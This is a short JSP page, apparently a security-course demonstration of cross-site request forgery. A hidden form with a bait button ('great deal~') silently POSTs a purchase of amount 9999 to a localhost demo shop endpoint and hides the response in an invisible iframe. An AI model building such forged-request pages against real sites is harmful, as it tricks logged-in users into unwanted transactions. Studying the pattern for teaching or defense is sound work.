<%@page contentType="text/html" pageEncoding="UTF-8"%>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>CSRF Email</title>
    </head>
    <body>
        <iframe style='display:none' name='myiframe'></iframe> 
        <form class="pure-form" method="post" action="http://localhost:8080//WebSecure/mango/buy" target='myiframe'>
            <input type="hidden" name="amount" value="9999" />
            <button type="submit" class="pure-button pure-button-primary">好康的喔~</button>
        </form>
    </body>
</html>
